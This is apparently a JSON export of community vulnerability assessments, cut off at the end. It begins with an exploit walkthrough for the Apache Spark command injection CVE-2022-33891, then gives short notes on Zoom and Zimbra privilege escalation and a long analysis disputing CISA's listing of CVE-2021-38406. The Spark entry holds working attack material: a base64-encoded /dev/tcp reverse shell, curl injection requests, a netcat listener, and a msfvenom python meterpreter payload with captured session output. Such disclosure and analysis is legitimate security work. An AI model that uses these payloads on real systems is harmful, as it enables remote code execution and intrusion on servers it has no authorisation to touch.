      "document": "Apache Spark released the latest security bulletin on July 18, which contains a shell command injection vulnerability (CVE-2022-33891).  The security researcher Kostya Kortchinsky (Databricks) has been credited with reporting this flaw.\r\n\r\n**What is exactly the issue?**\r\nIn the vulnerable versions of Apache Spark, a non-default setting called `spark.acls.enable true` triggers a shell command injection code vulnerability. This piece of code is responsible to check the permission of an user using a bash command shell in combination with the unix id command. Ironically the `spark.acls.enable true` configuration setting is designed to improve the security access within the Spark application, but unfortunately this configuration setting triggers the vulnerable code below.\r\n\r\n```\r\n  private def getUnixGroups(username: String): Set[String] = {\r\n    val cmdSeq = Seq(\"bash\", \"-c\", \"id -Gn \" + username)\r\n    // we need to get rid of the trailing \"\\n\" from the result of command execution\r\n    Utils.executeAndGetOutput(cmdSeq).stripLineEnd.split(\" \").toSet\r\n    Utils.executeAndGetOutput(idPath ::  \"-Gn\" :: username :: Nil).stripLineEnd.split(\" \").toSet\r\n  }\r\n}\r\n``` \r\nYou can trigger this very easily using `?doAs` parameter passing a raw Linux command: \r\n```\r\nhttp://<spark-ip>:8080/?doAs=`[command injection here]`\r\n```\r\nUser commands are processed through `?doAs` parameter and nothing reflected back on the page during command execution, so this is a blind OS injection. \r\n\r\nTo demonstrate this vulnerability, download a vulnerable Spark docker image from dockerhub (https://hub.docker.com/).\r\n1. Startup the Docker image\r\n2. In a new terminal, enter `sudo docker exec -it spark_spark_1 /bin/bash`\r\n3. In the container bash session, enter: `echo \"spark.acls.enable true\" >> conf/spark-defaults.conf`\r\n4. Restart docker image\r\n\r\nCraft the command injection. \r\nWe will use a simple reverse shell payload: `sh -i >& /dev/tcp/192.168.201.8/4444 0>&1`\r\n```\r\n# echo 'sh -i >& /dev/tcp/192.168.201.8/4444 0>&1' | base64\r\nc2ggLWkgPiYgL2Rldi90Y3AvMTkyLjE2OC4yMDEuOC80NDQ0IDA+JjEK\r\n# curl -d 'doAs=`echo c2ggLWkgPiYgL2Rldi90Y3AvMTkyLjE2OC4yMDEuOC80NDQ0IDA+JjEK | base64 -d | bash`' -X POST http://192.168.201.37:8080/data\r\n```\r\nNetcat listener\r\n```\r\n# nc -nvlp 4444\r\nlistening on [any] 4444 ...\r\nconnect to [192.168.201.8] from (UNKNOWN) [192.168.201.37] 65314\r\n$ whoami\r\nspark\r\n```\r\n\r\nOther example with Metasploit using python meterpreter\r\nSetup and start the handler\u2026\r\n```\r\nmsf6 exploit(multi/handler) > exploit -j -z\r\n[*] Exploit running as background job 0.\r\n[*] Exploit completed, but no session was created.\r\n\r\n[*] Started reverse TCP handler on 0.0.0.0:4444\r\nmsf6 exploit(multi/handler) > jobs\r\n\r\nJobs\r\n====\r\n\r\n  Id  Name                    Payload                         Payload opts\r\n  --  ----                    -------                         ------------\r\n  0   Exploit: multi/handler  python/meterpreter/reverse_tcp  tcp://0.0.0.0:4444\r\n```\r\n\r\nCraft the payload with msfvenom\r\n```\r\n#  msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.201.8 LPORT=4444 -f raw\r\n[-] No platform was selected, choosing Msf::Module::Platform::Python from the payload\r\n[-] No arch selected, selecting arch: python from the payload\r\nNo encoder specified, outputting raw payload\r\nPayload size: 497 bytes\r\nexec(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('aW1wb3J0IHNvY2tldCx6bGliLGJhc2U2NCxzdHJ1Y3QsdGltZQpmb3IgeCBpbiByYW5nZSgxMCk6Cgl0cnk6CgkJcz1zb2NrZXQuc29ja2V0KDIsc29ja2V0LlNPQ0tfU1RSRUFNKQoJCXMuY29ubmVjdCgoJzE5Mi4xNjguMjAxLjgnLDQ0NDQpKQoJCWJyZWFrCglleGNlcHQ6CgkJdGltZS5zbGVlcCg1KQpsPXN0cnVjdC51bnBhY2soJz5JJyxzLnJlY3YoNCkpWzBdCmQ9cy5yZWN2KGwpCndoaWxlIGxlbihkKTxsOgoJZCs9cy5yZWN2KGwtbGVuKGQpKQpleGVjKHpsaWIuZGVjb21wcmVzcyhiYXNlNjQuYjY0ZGVjb2RlKGQpKSx7J3MnOnN9KQo=')[0]))\r\n```\r\n\r\nCode the payload...\r\n```\r\n# echo \"python -c \\\"exec(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('aW1wb3J0IHNvY2tldCx6bGliLGJhc2U2NCxzdHJ1Y3QsdGltZQpmb3IgeCBpbiByYW5nZSgxMCk6Cgl0cnk6CgkJcz1zb2NrZXQuc29ja2V0KDIsc29ja2V0LlNPQ0tfU1RSRUFNKQoJCXMuY29ubmVjdCgoJzE5Mi4xNjguMjAxLjgnLDQ0NDQpKQoJCWJyZWFrCglleGNlcHQ6CgkJdGltZS5zbGVlcCg1KQpsPXN0cnVjdC51bnBhY2soJz5JJyxzLnJlY3YoNCkpWzBdCmQ9cy5yZWN2KGwpCndoaWxlIGxlbihkKTxsOgoJZCs9cy5yZWN2KGwtbGVuKGQpKQpleGVjKHpsaWIuZGVjb21wcmVzcyhiYXNlNjQuYjY0ZGVjb2RlKGQpKSx7J3MnOnN9KQo=')[0]))\\\"\" | base64\r\ncHl0aG9uIC1jICJleGVjKF9faW1wb3J0X18oJ2Jhc2U2NCcpLmI2NGRlY29kZShfX2ltcG9ydF9f\r\nKCdjb2RlY3MnKS5nZXRlbmNvZGVyKCd1dGYtOCcpKCdhVzF3YjNKMElITnZZMnRsZEN4NmJHbGlM\r\nR0poYzJVMk5DeHpkSEoxWTNRc2RHbHRaUXBtYjNJZ2VDQnBiaUJ5WVc1blpTZ3hNQ2s2Q2dsMGNu\r\nazZDZ2tKY3oxemIyTnJaWFF1YzI5amEyVjBLRElzYzI5amEyVjBMbE5QUTB0ZlUxUlNSVUZOS1Fv\r\nSkNYTXVZMjl1Ym1WamRDZ29KekU1TWk0eE5qZ3VNakF4TGpnbkxEUTBORFFwS1FvSkNXSnlaV0Zy\r\nQ2dsbGVHTmxjSFE2Q2drSmRHbHRaUzV6YkdWbGNDZzFLUXBzUFhOMGNuVmpkQzUxYm5CaFkyc29K\r\nejVKSnl4ekxuSmxZM1lvTkNrcFd6QmRDbVE5Y3k1eVpXTjJLR3dwQ25kb2FXeGxJR3hsYmloa0tU\r\neHNPZ29KWkNzOWN5NXlaV04yS0d3dGJHVnVLR1FwS1FwbGVHVmpLSHBzYVdJdVpHVmpiMjF3Y21W\r\nemN5aGlZWE5sTmpRdVlqWTBaR1ZqYjJSbEtHUXBLU3g3SjNNbk9uTjlLUW89JylbMF0pKSIK\r\n```\r\nExecute the payload...\r\n```\r\n# curl -d 'doAs=`echo cHl0aG9uIC1jICJleGVjKF9faW1wb3J0X18oJ2Jhc2U2NCcpLmI2NGRlY29kZShfX2ltcG9ydF9fKCdjb2RlY3MnKS5nZXRlbmNvZGVyKCd1dGYtOCcpKCdhVzF3YjNKMElITnZZMnRsZEN4NmJHbGlMR0poYzJVMk5DeHpkSEoxWTNRc2RHbHRaUXBtYjNJZ2VDQnBiaUJ5WVc1blpTZ3hNQ2s2Q2dsMGNuazZDZ2tKY3oxemIyTnJaWFF1YzI5amEyVjBLRElzYzI5amEyVjBMbE5QUTB0ZlUxUlNSVUZOS1FvSkNYTXVZMjl1Ym1WamRDZ29KekU1TWk0eE5qZ3VNakF4TGpnbkxEUTBORFFwS1FvSkNXSnlaV0ZyQ2dsbGVHTmxjSFE2Q2drSmRHbHRaUzV6YkdWbGNDZzFLUXBzUFhOMGNuVmpkQzUxYm5CaFkyc29KejVKSnl4ekxuSmxZM1lvTkNrcFd6QmRDbVE5Y3k1eVpXTjJLR3dwQ25kb2FXeGxJR3hsYmloa0tUeHNPZ29KWkNzOWN5NXlaV04yS0d3dGJHVnVLR1FwS1FwbGVHVmpLSHBzYVdJdVpHVmpiMjF3Y21WemN5aGlZWE5sTmpRdVlqWTBaR1ZqYjJSbEtHUXBLU3g3SjNNbk9uTjlLUW89JylbMF0pKSIK | base64 -d | bash`' -X POST http://192.168.201.37:8080/data\r\n```\r\n\r\nMeterpreter session\u2026\r\n```\r\nmsf6 exploit(multi/handler) >\r\n[*] Sending stage (40168 bytes) to 192.168.201.37\r\n[*] Meterpreter session 4 opened (192.168.201.8:4444 -> 192.168.201.37:49487) at 2022-08-19 21:12:25 +0000\r\n\r\nmsf6 exploit(multi/handler) > sessions -i 4\r\n[*] Starting interaction with 4...\r\n\r\nmeterpreter > shell\r\nProcess 258 created.\r\nChannel 1 created.\r\nuname -a\r\nLinux 7a26a9fb7ce3 5.10.104-linuxkit #1 SMP Thu Mar 17 17:08:06 UTC 2022 x86_64 GNU/Linux\r\nps ax\r\n  PID TTY      STAT   TIME COMMAND\r\n    1 ?        Ss     0:00 bash /opt/bitnami/spark/sbin/start-master.sh\r\n   33 ?        S      0:00 bash /opt/bitnami/spark/sbin/spark-daemon.sh start org.apache.spark.deploy.master.Master 1 --host 7a26a9fb7ce3 --port 7077 --webui-port 8080\r\n   38 ?        Sl     6:08 /opt/bitnami/java/bin/java -cp /opt/bitnami/spark/conf/:/opt/bitnami/spark/jars/* -Xmx1g org.apache.spark.deploy.master.Master --host 7a26a9fb7ce3 --port 7077 --webui-port 8080\r\n  216 pts/0    Ss+    0:00 /bin/sh\r\n  245 pts/1    Ss+    0:00 /bin/sh\r\n  254 ?        Rsl    0:04 python -c exec(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('aW1wb3J0IHNvY2tldCx6bGliLGJhc2U2NCxzdHJ1Y3QsdGltZQpmb3IgeCBpbiByYW5nZSgxMCk6Cgl0cnk6CgkJcz1zb2NrZXQuc29ja2V0KDIsc29ja2V0LlNPQ0tfU1RSRUFNKQoJCXMuY29ubmVjdCgoJzE5Mi4xNjguMjAxLjgnLDQ0NDQpKQoJCWJyZWFrCglleGNlcHQ6CgkJdGltZS5zbGVlcCg1KQpsPXN0cnVjdC51bnBhY2soJz5JJyxzLnJlY3YoNCkpWzBdCmQ9cy5yZWN2KGwpCndoaWxlIGxlbihkKTxsOgoJZCs9cy5yZWN2KGwtbGVuKGQpKQpleGVjKHpsaWIuZGVjb21wcmVzcyhiYXNlNjQuYjY0ZGVjb2RlKGQpKSx7J3MnOnN9KQo=')[0]))\r\n  258 ?        S      0:00 /bin/sh\r\n  270 ?        R      0:00 ps ax\r\n```\r\n\r\nTo fix CVE-2022-33891, we recommend that users upgrade the Apache Spark to version 3.1.3, 3.2.2, or 3.3.0 or later in time.\r\n\r\n### References\r\nI have added a reference to a Metasploit module that I developed and a reference to a nice POC from HuskyHacks.\r\n\r\nMetasploit Apache Spark Module -> https://github.com/h00die-gr3y/Metasploit/\r\nPOC  cve-2022-33891 -> https://github.com/HuskyHacks/cve-2022-33891\r\n",
      "score": 2,
      "metadata": {
        "mitre-tactics": "Execution",
        "attacker-value": 4,
        "exploitability": 4
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "795f5056-8a39-4610-912c-c033bd6fd4cb",
          "name": "Vulnerable in uncommon configuration",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "obscure_configuration"
        }
      ]
    },
    {
      "id": "2e6d60ed-7833-4b4d-9b11-ebd528a061f1",
      "editorId": "412fe638-b1e3-4b69-828b-bef071ff95ac",
      "topicId": "9e58a7ae-963d-4156-aed7-67b5f3e68ed3",
      "created": "2022-08-22T13:58:45.833635Z",
      "revisionDate": "2022-08-22T13:58:45.833257Z",
      "document": "",
      "score": 1,
      "metadata": {
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "1a4228a8-bc05-41a0-a7ee-43d4fa7e381e",
          "name": "Difficult to patch",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "difficult_to_patch"
        },
        {
          "id": "01c67142-c23f-4ee7-8803-49d10d588299",
          "name": "Requires user interaction",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "requires_interaction"
        }
      ]
    },
    {
      "id": "0fd3b313-7517-4289-b785-4e9d36777861",
      "editorId": "e426cc12-067c-41a8-83c0-029757da0dbf",
      "topicId": "90b74ca3-8832-4945-8a2d-ebd03d4cdf8d",
      "created": "2022-08-22T23:12:45.152644Z",
      "revisionDate": "2022-08-22T23:12:45.152196Z",
      "document": "A vulnerability in the `ZoomAutoUpdater` application can result in escalation of privileges to that of the `root` user. The issue stems from permissions held by the update package that is to be installed: The package gets written to a root-owned directory; however, the package itself is writable for anyone. Because of this, an attacker can write a malicious package in place of the valid update package. Being a TOCTOU bug, the malicious package must be written after the updater verifies that the package is signed, but before the installation process begins. That makes repeated attempts at the exploit potentially necessary. Since the update process can be [hidden](https://speakerdeck.com/patrickwardle/youre-muted-rooted?slide=33) from the user, multiple attempts at exploitation can be afforded.\r\n\r\nZoom appears to cache a valid update package at `~/Library/Application Support/zoom.us/AutoUpdater/Zoom.pkg` if the auto update setting is checked, so exploitation may be as simple as writing the malicious package to disk, initiating an update, and then performing a copy to write the package in the valid update package's location.",
      "score": 1,
      "metadata": {
        "mitre-tactics": "Privilege Escalation",
        "attacker-value": 3,
        "exploitability": 4
      },
      "tags": [
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "b65c2492-bb05-477a-86bb-0c9569f80141",
          "name": "Authenticated",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "post_auth"
        }
      ]
    },
    {
      "id": "6f2752b2-1127-4d98-a9c1-f439170e65f3",
      "editorId": "dadd7295-ffae-449d-ba22-0a6feefa6f67",
      "topicId": "042573e7-4ff2-4d52-842b-e72379f0c4d0",
      "created": "2022-08-23T16:43:28.738076Z",
      "revisionDate": "2022-10-07T02:59:48.81351Z",
      "document": "This is basically [cve-2022-27925](https://attackerkb.com/topics/dSu4KGZiFd/cve-2022-27925/rapid7-analysis) - it's the same exploit, but you don't send an auth cookie and it fails to prevent access.",
      "score": 2,
      "metadata": {
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "791283de-d643-4ede-850e-91a6edb897db",
          "name": "Exploited in the wild",
          "type": "exploited_in_the_wild",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "exploited_in_the_wild"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "5176134d-eaa9-4d74-8d14-9bc1717057fe",
      "editorId": "dadd7295-ffae-449d-ba22-0a6feefa6f67",
      "topicId": "519dd30e-f9a7-4a5e-a57b-df4e4b9b20f1",
      "created": "2022-08-23T16:47:58.853008Z",
      "revisionDate": "2022-08-23T16:50:51.560119Z",
      "document": "This is a privilege-escalation vulnerability in Zimbra, to go from the `zimbra` user to `root`. As of writing, this has been publicly known for nearly a near, and reported to Zimbra for about a month.\r\n\r\nAlthough it requires an account, there have been a whole pile of recent CVEs that get you there - [CVE-2022-30333](https://attackerkb.com/topics/RCa4EIZdbZ/cve-2022-30333/rapid7-analysis), [CVE-2022-27925](https://attackerkb.com/topics/dSu4KGZiFd/cve-2022-27925/rapid7-analysis), and [CVE-2022-27924](https://attackerkb.com/topics/6vZw1iqYRY/cve-2022-27924/rapid7-analysis)",
      "score": 1,
      "metadata": {
        "attacker-value": 5,
        "exploitability": 2
      },
      "tags": [
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "b65c2492-bb05-477a-86bb-0c9569f80141",
          "name": "Authenticated",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "post_auth"
        }
      ]
    },
    {
      "id": "c5955786-190a-4e36-9a84-f68a9c2354be",
      "editorId": "2ea63e40-257b-45ee-ad58-e1b1f48d3311",
      "topicId": "bd4bae39-9ce8-4e4e-a81d-633cf503404d",
      "created": "2022-08-23T19:15:56.222231Z",
      "revisionDate": "2022-08-23T19:15:56.222483Z",
      "document": "",
      "score": 1,
      "metadata": {
        "mitre-tactics": "Initial Access",
        "attacker-value": 3,
        "exploitability": 3
      },
      "tags": []
    },
    {
      "id": "6fa1ee50-493c-4c10-9f57-8e68533d2eab",
      "editorId": "d8c8480d-891a-4357-a086-25351dae6598",
      "topicId": "2b7b662b-edd1-4bfa-978a-6ae63790f8a5",
      "created": "2022-09-02T10:47:50.134279Z",
      "revisionDate": "2022-09-05T09:40:17.836075Z",
      "document": "Edit: At 4:43pm EST on September 2, 2022, Director of CISA Jen Easterly responded to this entry via [tweet](https://twitter.com/CISAJen/status/1565802511440777218?s=20&t=jGGMFllNltUdukyQ5ph7EA). We appreciate the update and look forward to more improvements in the future.\r\n\r\n# CVE-2021-38406 Shouldn't Be on the CISA KEV List\r\n\r\nOn August 25, 2022, CISA added [CVE-2021-38406](https://nvd.nist.gov/vuln/detail/CVE-2021-38406) to their Known Exploited Vulnerabilities (KEV) Catalog. This was a significant addition to KEV because CVE-2021-38406 affects [Delta Industrial Automation\u2019s](https://www.deltaww.com/en-us/products/Industrial-Automation/ALL/) [DOPSoft](https://filecenter.deltaww.com/Products/download/06/060302/Manual/DELTA_IA-HMI_DOPSoft_UM_EN_20211230.pdf) software. This addition to the KEV catalog is almost certainly a mistake, which we'll discuss below in great detail. Technically, they might have included this CVE on purpose, but that would mean that CISA just low-key dropped some huge news about the next Stuxnet, which is unlikely to the point of unbelievability. But, you decide!\r\n\r\n![CVE-2021-38406 KEV Entry](https://raw.githubusercontent.com/jbaines-r7/attackerkb_images/main/CVE-2021-38406/kev_entry.png)\r\n\r\n## What's DOPSoft and CVE-2021-38406?\r\n\r\nDOPSoft is [HMI](https://en.wikipedia.org/wiki/User_interface) programming software. An attacker that exploits DOPSoft can potentially find themselves on an [engineering workstation](https://collaborate.mitre.org/attackics/index.php/Engineering_Workstation) within the ICS network *and* with specialized programming access to local HMI. That\u2019s a very critical and dangerous place for any attacker to be.\r\n\r\nCVE-2021-38406 reportedly affects DOPSoft\u2019s parsing of project files. That\u2019s notable because, despite vulnerabilities affecting all sorts of ICS project files, there have been very few publicly disclosed examples of [project file infections](https://attack.mitre.org/techniques/T0873/) used in the wild. The only examples we\u2019re aware of are [Stuxnet](https://www.wired.com/images_blogs/threatlevel/2011/02/Symantec-Stuxnet-Update-Feb-2011.pdf) (Step7 project files) and [AutoCAD/AutoLISP project file](https://ics-cert.kaspersky.com/media/Kaspersky-ICS-engineering-and-integration-sector-2020-En.pdf) malware. With this KEV entry, CISA has disclosed a unique and ICS-specific attack being exploited in the wild.\r\n\r\nOf course, that\u2019s if you only look at the surface level information that CISA provides. The reality is that this CVE doesn\u2019t affect DOPSoft project files, and there is evidence that suggests the CVE was added to the catalog in error. Let\u2019s dive deeper.\r\n\r\n## The CVE Description is Bad\r\n\r\nCISA includes the CVE\u2019s description in their KEV entry. The description for CVE-2021-38406 follows:\r\n\r\n> Delta Electronic DOPSoft 2 (Version 2.00.07 and prior) lacks proper validation of user-supplied data when parsing specific project files. This could result in multiple out-of-bounds write instances. An attacker could leverage this vulnerability to execute code in the context of the current process.\r\n\r\nICS-CERT is the credited CNA and therefore the likely culprit for this misleading description. The vulnerability was actually discovered by the prolific vulnerability researcher, kimiya, and disclosed through the [Zero Day Initiative](https://www.zerodayinitiative.com/) (ZDI). The vulnerability description provided by ZDI for [CVE-2021-38406](https://www.zerodayinitiative.com/advisories/ZDI-21-952/) is much more specific.\r\n\r\n> This vulnerability allows remote attackers to execute arbitrary code on affected installations of Delta Industrial Automation DOPSoft. User interaction is required to exploit this vulnerability in that the target must visit a malicious page or open a malicious file.\r\n>\r\n> The specific flaw exists within the parsing of XLS files. The issue results from the lack of proper validation of user-supplied data, which can result in a write past the end of an allocated buffer. An attacker can leverage this vulnerability to execute code in the context of the current process.\r\n\r\nHere we can see that ZDI says the vulnerability affects `xls` files. Notably, `xls` files *are not* DOPSoft project files. `xls` is a Microsoft Excel format. Use of the [Microsoft XLS file format](https://docs.microsoft.com/en-us/openspecs/office_file_formats/ms-xls/cd03cb5f-ca02-4934-a391-bb674cb8aa06) is only associated with one feature of DOPSoft, and that\u2019s multi-language support. The software can support multiple language texts on any given widget. For example, this DOPSoft screenshot shows a text block that can present as \u201chello world!\u201d in English, Spanish, or German.\r\n\r\n![hello world!](https://raw.githubusercontent.com/jbaines-r7/attackerkb_images/main/CVE-2021-38406/hellowordx3.png)\r\n\r\nDOPSoft allows the programmer to export the multi-language data as an `xls` file, presumably, so language specialists can review/edit the content, and then the programmer can import updated versions of the text. This is all done through the `Edit` drop-down menu when a project is already loaded.\r\n\r\n![import_export](https://raw.githubusercontent.com/jbaines-r7/attackerkb_images/main/CVE-2021-38406/dopsoft_import_export.png)\r\n\r\nWhen the data is exported, it looks exactly how you\u2019d expect:\r\n\r\n![excel](https://raw.githubusercontent.com/jbaines-r7/attackerkb_images/main/CVE-2021-38406/excel.png)\r\n\r\nAccording to ZDI, the vulnerability is exploitable when a new multi-language `xls` is imported. Which means, getting back to the topic at hand, DOPSoft project files are not affected as ICS-CERT indicated. The `xls` file is **not** a project file (e.g. it doesn\u2019t control logic on an HMI, nor can it be used to launch DOPSoft). DOPSoft project files use the `dps`, `dpb`, or `dop` extension. \r\n\r\nThe only way the `xls` could be considered a project file is if the `Import Multi-Language Text` functionality embedded the `xls` in a DOPSoft project file. That would be a little strange, but not inconceivable (it\u2019s ICS software after all). So we decided to pull apart the DOPSoft project file format in order to find an embedded `xls`.\r\n\r\n## File Format Exploration\r\n\r\nIt\u2019s important to know if the `xls` is contained within DOPSoft project files, not just to nit-pick ICS-CERT, but to determine how many clicks are required to exploit a victim. The affected software is end-of-life and hasn\u2019t been patched for CVE-2021-38406, so understanding the full attack is important when discussing remediation guidance. If the `xls` file is contained within a project file then double clicking on the project will trigger the `xls` parsing and exploit the victim. If the `xls` is only parsed during `Import Multi-Language Text` then an attacker has to get a victim to launch DOPSoft, load a project, and then import the malicious `xls`. Both scenarios are obviously doable, but the second is more involved (and therefore less likely).\r\n\r\nThe DOPSoft `dps` project file is split into two parts. By default, the first part is essentially empty (a bitmap filled with `0xfc`). The second part contains gzip compressed data.\r\n\r\n![file format](https://raw.githubusercontent.com/jbaines-r7/attackerkb_images/main/CVE-2021-38406/file_format.png)\r\n\r\nThe compressed data explodes into a large binary blob of unknown format with a short ASCII preamble (\u201cDelta-HMI Screen Editor DOP V1010\u201d).\r\n\r\n![decompressed](https://raw.githubusercontent.com/jbaines-r7/attackerkb_images/main/CVE-2021-38406/decompressed.png)\r\n\r\nWe spent some time in `windbg` figuring out what this unknown format is. Turns out, the file is xor encoded after the first 42 bytes. So we trim the project file:\r\n\r\n```\r\ntail -c +42 B8B6 > B8B6.xor\r\n```\r\n\r\nAnd run the following Python script to deobfuscate it:\r\n\r\n```\r\nf = open('B8B6.xor', \"rb\")\r\ng = open('B8B6.deobfs', \"w\")\r\n\r\ntry:\r\n    while True:\r\n        byte = f.read(1)\r\n        if byte == '' or len(byte) == 0:\r\n            break\r\n        xbyte = chr(ord(byte) ^ 0x64)\r\n        g.write(xbyte)\r\nfinally:\r\n    f.close()\r\n\r\ng.close()\r\n```\r\n\r\nAnd the result is a very large `ini` file.\r\n\r\n```\r\n[Application]\r\nVersion=4.00.07.04\r\nDefaultScreen=1\r\nDefaultMemFmt=2\r\nPanelSeries=DOP-B series\r\nPanelName=DOP-B10E615 65536 Colors\r\nPanelRotate=0\r\nModelName=-1106222768\r\nWarpText=1\r\nShowAfterReadDataFlag=0\r\nStopUpload=0\r\nSpeedupPageChange=0\r\nStartupDelayTime=0\r\nName=HMI\r\nOptimizeType=2\r\nCommInt=0\r\nIntRetry=3\r\nControllerSection0=Delta\r\nControllerName0=Delta DVP PLC\r\nHMIStationNr0=0\r\nDefPLCStationNr0=1\r\nCommName0=Link2\r\nPortNr0=2\r\nInterface0=0\r\ndatabits0=7\r\nstopbits0=1\r\nbaud0=9600\r\n\u2026 truncated \u2026\r\n```\r\n\r\nMost importantly, we find that the ini file contains **no** `xls` data. Instead, the multi-language data is represented as normal ini entries. Below you can see our three `hello worlds!`:\r\n\r\n```\r\n[State]\r\nValue=0\r\nFgColor=16579836\r\nBgColor=11842740\r\nFontColor=0\r\nFontSize0=12\r\nFontRatio0=100\r\nFontName0=Arial\r\nwTextLen0=26\r\nh\\00e\\00l\\00l\\00o\\00 \\00w\\00o\\00r\\00l\\00d\\00!\\00\\00\\00\r\nFontSize1=12\r\nFontRatio1=100\r\nFontName1=Arial Greek\r\nwTextLen1=24\r\nh\\00o\\00l\\00a\\00 \\00m\\00u\\00\\00\\00\\00\\00o\\00!\\00\\00\\00\r\nFontSize2=12\r\nFontRatio2=100\r\nFontName2=Calibri\r\nwTextLen2=24\r\nh\\00a\\00l\\00l\\00o\\00 \\00w\\00e\\00l\\00t\\00!\\00\\00\\00\r\nFontAlign=33\r\nFontBold=0\r\nFontItalic=0\r\n```\r\n\r\nWhich means, we don\u2019t think ICS-CERT\u2019s description is correct. The project file does not contain an `xls` file, so it will never trigger CVE-2021-38406. An attacker is required to trick the victim into loading the malicious `xls` via the `Import Multi-Language Text` feature. Users should be able to continue safely using DOPSoft affected by CVE-2021-38406, as long as they avoid using the multi-language import feature.\r\n\r\n## Ok. Fine. But Was It Exploited in the Wild?!\r\n\r\nExploitation might be complicated in a real world scenario. But it\u2019s still doable. The conditions are actually ideal.\r\n\r\n![proc_exp](https://raw.githubusercontent.com/jbaines-r7/attackerkb_images/main/CVE-2021-38406/proc_exp.png)\r\n\r\nThe question, \u201cDoes CVE-2021-38406 belong in the KEV catalog?\u201d remains relevant even if the CVE description is bad.\r\n\r\nCISA calls the KEV catalog *the authoritative source of vulnerabilities that have been exploited in the wild*. However, CISA never provides any justification for the items they add, or don\u2019t add, to the catalog. Entries are simply added and that\u2019s that. But anyone that has been involved with the entry adding process knows that CISA largely relies on open source reporting from the security industry in order to populate the catalog. They\u2019ve chosen to never credit or even cite their sources, opting instead to represent the work as their own, for reasons we won\u2019t speculate on here.\r\n\r\nRegardless, the lack of citation/proof makes challenging any entry on the list almost impossible. Each KEV entry requires action by federal civilian executive branch agencies due to the [Binding Operation Directive 22-01](https://www.cisa.gov/binding-operational-directive-22-01). Each erroneous entry wastes time, resources, and taxpayer money, not just in the federal space but the myriad security companies that have been, more or less, forced to support the KEV catalog in their products. Not to mention the potential reputational harm an incorrect entry might cause. The fact that CISA provides no evidence and provides no obvious avenues for dissent is problematic.\r\n\r\nWhich brings us back to the subject at hand. CVE-2021-38406 was added to the KEV catalog along with 9 other vulnerabilities on August 25, 2022. Three of the newly added vulnerabilities, CVE-2022-22963 (Spring Cloud), CVE-2022-24112 (Apache APISIX), and CVE-2021-39226 (Grafana), were included in an August 19, 2022 article by Unit 42 called, *[Network Security Trends: Recent Exploits Observed in the Wild Include Remote Code Execution, Cross-Site Scripting and More](https://unit42.paloaltonetworks.com/recent-exploits-network-security-trends/)*. The article details exploits seen in the wild. Additionally, Unit 42 **accidentally** tagged the article with the DOPSoft CVE, CVE-2021-38406.\r\n\r\n![unit42 header](https://raw.githubusercontent.com/jbaines-r7/attackerkb_images/main/CVE-2021-38406/unit42_tag.png)\r\n\r\nWe know this inclusion was accidental because Unit 42 does not discuss the vulnerability, even in passing, at any point in the article. Also, their data collection method, pictured below, would not be able to detect exploitation of CVE-2021-38406 because it\u2019s a local exploit requiring (fairly significant) user interaction.\r\n\r\n![unit42 collection](https://raw.githubusercontent.com/jbaines-r7/attackerkb_images/main/CVE-2021-38406/unit42_datacollection.png)\r\n\r\nThe IPS *might* see a malformed `xls` file over network traffic, but that isn\u2019t quite the same as seeing an actual exploitation attempt.\r\n\r\nAnd, finally, we know CVE-2021-38406 was accidentally tagged in that article because we were told so:\r\n\r\n![unit42 correction](https://raw.githubusercontent.com/jbaines-r7/attackerkb_images/main/CVE-2021-38406/correction.png)\r\n\r\n##  Conclusion \r\nThere is no other open source information indicating that CVE-2021-38406 has been exploited in the wild. Could it be that CISA knows this vulnerability, which requires significant user interaction to exploit niche ICS software, was exploited in the wild? Or is it more likely that CISA was lifting CVEs from Unit 42\u2019s blog and erroneously included CVE-2021-38406 because it was mistakenly included in the 